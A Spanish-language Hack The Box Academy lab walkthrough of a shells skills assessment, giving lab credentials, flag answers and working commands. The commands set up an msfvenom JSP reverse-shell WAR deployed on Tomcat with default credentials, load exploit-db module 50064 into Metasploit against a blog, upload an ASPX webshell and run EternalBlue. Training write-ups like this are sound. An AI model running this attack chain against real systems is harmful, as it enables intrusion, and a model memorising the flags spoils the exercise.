**Target(s): 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD)   
RDP to 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD) with user "htb-student" and password "HTB_@cademy_stdnt!"

**1. What is the hostname of Host-1? (Format: all lower case)**

El Host-01 tiene como IP: 172.16.1.11:8080, IP sobre la cual no tengo acceso. Accedo a ella mediante el servidor RDP que nos facilita el enunciado (máquina FOOTHOLD), con:
```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.97.240
```

Ejecutando desde dicha terminal un:
```
nc -nv 172.16.1.11 8080
```
NO nos devuelve nada. 

Ejecutamos un: 
```
map -sCV 172.16.1.11 -Pn -n --open --min-rate 2000
```

Y varias veces durante la salida del comando, se especifica que el "Target-Name" es:
"shells-winsvr"
**Respuesta**: *shells-winsvr*



**2.  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
Accedemos mediante firefox a "172.16.1.11:8080", y observamos el menú por defecto de un servidor TOMCAT. Mediante el botón "Manager App", ingresamos las credenciales "tomcat : Tomcatadm" (link: https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd) y vemos como efectivamente podemos acceder al servidor. 

Existe una opción que dice "WAR file to deploy". Pues, vamos a intentar cargar una reverse shell en dicho servidor. 
En primer lugar, tenemos que tener presente que existen diferentes tipos de arquitecturas:

| Lenguaje/Plataforma | Extensión de archivo webshell | Comentario                                                               |
| ------------------- | ----------------------------- | ------------------------------------------------------------------------ |
| ASP clásico         | `.asp`                        | Servidores Windows antiguos con IIS.                                     |
| ASP.NET             | `.aspx`                       | Windows moderno con IIS; muy usado en aplicaciones empresariales.        |
| JSP (Java)          | `.jsp`                        | Servidores Java/Tomcat, típicos en aplicaciones corporativas Java.       |
| PHP                 | `.php`                        | Servidores Linux/Windows con PHP instalado; el más común en web pública. |

Concretamente, necesitaremos utilizar un payload de msfvenom que utilice la arquitectura: 

| Lenguaje/Plataforma | Extensión de archivo webshell | Comentario                                                               |
| ------------------- | ----------------------------- | ------------------------------------------------------------------------ |
| JSP (Java)          | `.jsp`                        | Servidores Java/Tomcat, típicos en aplicaciones corporativas Java.       |

Con msfvenom listamos todos los payloads disponibles con el comando:
```
msfvenom -l payloads
```

Filtramos por payloads del tipo ".jsp" y observamos que existe una reverseshell disponible:

```
└─$ msfvenom -l payloads | grep "jsp"
    java/jsp_shell_bind_tcp                 Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp              Connect back to attacker and spawn a command shell    <------
```

Generamos el payload con:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4443 -f war > shell.war
```
Siendo "LHOST la IP de la máquina" atacante, dirección consultada con "ip a"

Lo subimos al servidor Tomcat en el apartado de "subir .war files".
Desde el atacante, nos ponemos por escucha por el puerto 4443 con el comando y recibimos la reverseshell.

Simplemente ahora accedemos a "dir C:\\Shares"
y observamos que el nombre de la carpeta es: "dev-share".
Respuesta: *"dev-share"

**3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case)**
El Host-02 tiene la IP "blog.inlanefreight.local".
No tenemos permisos root, pero, observo que en el archivo "/etc/hosts" ya existe la entrada a dicha dirección:
```
cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local                
172.16.1.12  blog.inlanefreight.local             <--------------
10.129.201.134  lab.inlanefreight.local
```

Ejecuto un escaneo básico y observo:
```
nmap -sCV --open --min-rate 2000 -Pn -n blog.inlanefreight.local -vvv
```
Que en la propia salida, se indica que el sistema está corriendo bajo "UBUNTU"
Respuesta: *"ubuntu"

**4. What language is the shell written in that gets uploaded when using the 50064.rb exploit?**
Ejecuto un:
```
find / -type f -name "50064.rb" 2>/dev/null 
	/home/administrator/Downloads/50064.rb
	/home/administrator/.msf4/modules/blog/50064.rb
	/home/htb-student/.msf4/modules/exploits/php/webapps/50064.rb
	/usr/share/metasploit-framework/modules/exploits/50064.rb
	/usr/share/exploitdb/exploits/php/webapps/50064.rb

```

Haciendo un cat a dicho archivo, observo como el "payload" está escrito en PHP:

```
'Platform'       => ['php'],
      'Arch'           => [ ARCH_PHP],
      'Targets'        =>
        [
          ['PHP payload',
            {
              'Platform' => 'PHP',
              'Arch' => ARCH_PHP,
              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}

```
Respuesta: *php*

**5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt**

Al entrar a msfconsole y buscar por "search 50064", me pone que no existe ningún módulo. 

Teniéndolo ubicado en: "/usr/share/exploitdb/exploits/php/webapps/50064.rb"
Para que metasploit lo encuentre, tengo qué guardarlo en una ruta concreta.
En primer lugar, creo esa ruta con:

```
mkdir -p ~/.msf4/modules/exploits/php/webapps
```
- La opción -p crea todo el árbol de directorios necesario y no da error si ya existe.
- ~/.msf4/modules/exploits/php/webapps es la ruta dentro de tu usuario donde Metasploit busca módulos personalizados. Al crear esa estructura, preparas un lugar donde msf podrá detectar módulos que pongas ahí sin tocar /usr/share.

Ejecuto:
```
cp /usr/share/exploitdb/exploits/php/webapps/50064.rb ~/.msf4/modules/exploits/php/webapps/50064.rb
```

Esto:
- Copia el `50064.rb` desde el repositorio de **exploit-db** (ruta original) hacia mi carpeta personal de módulos de Metasploit (~/.msf4/...).
- Al tener el .rb dentro de ~/.msf4/modules/... y con la estructura correcta (exploits/php/webapps/), msfconsole podrá cargarlo como un módulo cuando recargues los módulos.

Entro a "msfconsole" y ejecuto:
```
run reload_all
```
Para refrescar los módulos de metasploit.

Finalmente, ejecuto:
```
search 50064
use 0
set RHOST 172.16.1.12        (esto lo encuentro mediante el /etc/hosts)
set USER admin               (estas credenciales son una HINT de HTB, que sin ellas no se puede avanzar. HINT de enunciado, no de ejercicio).
set PASSWORD admin123!@#     (estas credenciales son una HINT de HTB, que sin ellas no se puede avanzar. HINT de enunciado, no de ejercicio).
set VHOST blog.inlanefreight.local
run
```

Finalmente, cuando la sesión de meterpreter se nos devuelve, ejecuto un "shell", y accedo a la flag con:
```
cat /customscripts/flag.txt
```

Siendo la respuesta del ejercicio: "*B1nD_Shells_r_cool*"


 **6. What is the hostname of Host-3?**
 Haciendo un escaneo básico:
``` 
nmap -sCV -Pn -n --open --min-rate 2000 172.16.1.13 -vvv
```

Observo que el nombre de la máquina es "SHELLS-WINBLUE"

Respuesta: *"SHELLS-WINBLUE"*

**7. Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt**
Haciendo un escaneo básico de nmap observo que cuenta con un sistema operativo Windows del 2008-2012. 
Observo que al entrar en "172.16.1.13" a travñés de firefox, me muestra un panel con varias opciones:
```
 10/5/2020  6:51 PM        <dir> aspnet_client
 10/5/2020  6:54 PM          791 upload.aspx
 10/5/2020  7:03 PM          873 upload.aspx.cs
 10/5/2020  7:07 PM        <dir> uploads
 10/5/2020  7:07 PM          400 web.config
```

En el apartado "upload.aspx" puedo subir archivos, mientras que en el "uploads" puedo ver esos archivos subidos. 

Y efectivamente, subiendo la webshell ubicada en:
```
/usr/share/webshells/aspx/cmdasp.aspx
```

Me devuelve una webhsell. 
Pero... haciendo un "whoami" en esa webshell observo que soy "iis apppool\defaultapppool"; pues, no tengo permisos de administrador para entrar en la ruta *C:\Users\Administrator\Desktop\Skills-flag.txt*.

Entonces, vamos a probar la vulnerabilidad *EternalBlue* sobre esta máquina.

Abro *msfconsole* y ejecuto:
```
search eternalblue
```

Utilizamos el exploit "windows/smb/ms17_010_psexec".
Seteamos el 
- RHOST: 172.16.1.13
- LHOST: 172.16.1.5               (consultado con IP A)

Finalmente, conseguimos la sesión de meterpreter, cargamos una consola interactiva con "shell", y ejecutamos un:
```
type "C:\Users\Administrator\Desktop\Skills-flag.txt"
```

Como respuesta, se obtiene la flag: *"One-H0st-Down!"*

